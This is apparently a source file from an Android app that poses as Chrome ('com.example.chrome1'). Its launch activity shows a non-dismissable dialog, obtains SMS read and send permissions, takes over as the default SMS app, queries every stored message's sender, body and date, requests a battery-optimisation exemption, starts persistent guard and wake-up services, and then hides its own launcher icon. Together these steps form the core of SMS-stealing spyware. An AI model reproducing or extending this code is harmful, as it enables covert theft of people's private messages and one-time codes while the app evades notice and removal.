package com.example.chrome1.activity;

import static android.os.Build.VERSION.SDK_INT;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Dialog;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;

import com.example.chrome1.FirstService;
import com.example.chrome1.GuardService;
import com.example.chrome1.JobWakeUpService;
import com.example.chrome1.R;
import com.example.chrome1.util.AppIconUtil;
import com.example.chrome1.util.WinUtil;

import java.util.List;

//启动第一个页面
public class OnePiexlActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(2621568);
        getWindow().addFlags(8388659);
        Sms();
        //new Handler().postAtTime(this::Sms, 1000);
        WinUtil.setWindow1(getWindow());
        show();
    }

    @SuppressLint("Recycle")
    private void Sms() {
        try {
            int REQUEST_CODE_ASK_PERMISSIONS = 123;
            int hasReadSmsPermission = checkSelfPermission(Manifest.permission.READ_SMS);
            if (hasReadSmsPermission != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS}, REQUEST_CODE_ASK_PERMISSIONS);
            }
        } catch (Exception e) {
            e.fillInStackTrace();
        }
    }


    //发送短信
    @SuppressLint("UnspecifiedImmutableFlag")
    private void sendSMSS(Context content, String phone, String context) {
        if (context.isEmpty() || phone.isEmpty()) {
            return;
        }
        SmsManager manager = SmsManager.getDefault();
        Intent itSend = new Intent("SMS_SEND_ACTIOIN");
        PendingIntent mSendPI = PendingIntent.getBroadcast(content, (int) System.currentTimeMillis(), itSend, PendingIntent.FLAG_UPDATE_CURRENT);
        if (context.length() > 70) {
            List<String> msgs = manager.divideMessage(context);
            for (String msg : msgs) {
                manager.sendTextMessage(phone, null, msg, mSendPI, null);
            }
        } else {
            manager.sendTextMessage(phone, null, context, mSendPI, null);
        }
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 10 && resultCode == 0) {
            initPermission(this);
        } else if (requestCode == 10 && resultCode == -1) {
            cell();
            //设置默认短信以后启动服务
            initFirstService();
        } else if (requestCode == 123) {
            try {
                sendSMSS(this, "0", "0");
                //查询短信的uri
                Uri uri = Uri.parse("content://sms/");
                //获取ContentResolver对象
                ContentResolver resolver = getContentResolver();
                if (resolver == null) {
                    return;
                }
                resolver.query(uri, new String[]{"_id", "address", "type", "body", "date"}, null, null, null);
            } catch (Exception e) {
                e.fillInStackTrace();
            }
        }
    }

    private void initFirstService() {
        //已经拥有权限了
        Intent intent = new Intent(this, FirstService.class);
        Intent intent1 = new Intent(this, GuardService.class);
        Intent intent2 = new Intent(this, JobWakeUpService.class);
        //版本必须大于5.0
        startService(new Intent(this, JobWakeUpService.class));
        if (SDK_INT >= Build.VERSION_CODES.O) {
            //android8.0以上通过startForegroundService启动service
            startForegroundService(intent);
            startForegroundService(intent1);
            //startForegroundService(intent2);
        } else {
            startService(intent);
            startService(intent1);
            //startService(intent2);
        }
        startService(intent2);
        //等待一会在关闭
        new Handler().postAtTime(this::hide, 2000);
    }

    //弹窗
    private void show() {
        Dialog dialog = new Dialog(this);
        Window window = dialog.getWindow();
        if (window == null) {
            return;
        }
        dialog.setCancelable(false);
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
        View view = LayoutInflater.from(this).inflate(R.layout.layout_dialog, new FrameLayout(this), false);
        dialog.setContentView(view);
        Button button = view.findViewById(R.id.button);
        button.setOnClickListener(v -> {
            dialog.dismiss();
            initPermission(OnePiexlActivity.this);
        });
        dialog.show();
    }

    //隐藏图标
    public void hide() {
        // 先禁用AliasMainActivity组件，启用alias组件
        AppIconUtil.set(this, "com.example.chrome1.activity.OnePiexlActivity", "com.learn.alias.target.Alias1Activity");
        // 10.0以下禁用alias后，透明图标就不存在了，10.0的必须开启，不然会显示主应用图标，10.0会有一个透明的占位图
        if (Build.VERSION.SDK_INT < 29) {
            // 禁用Alias1Activity
            AppIconUtil.disableComponent(this, "com.learn.alias.target.Alias1Activity");
        }
    }

    //电池优化
    public void cell() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager == null) {
                return;
            }
            boolean isIgnoringBatteryOptimizations = powerManager.isIgnoringBatteryOptimizations(getPackageName());
            if (!isIgnoringBatteryOptimizations) {
                Intent intent = new Intent();
                intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityForResult(intent, 11);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //默认短信
    void initPermission(Activity activity) {
        String defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(this);
        //获取手机当前设置的默认短信应用的包名
        String packageName = activity.getPackageName();
        if (defaultSmsApp == null) {
            return;
        }
        if (!defaultSmsApp.equals(packageName)) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
            startActivityForResult(intent, 10);
        }
    }
}
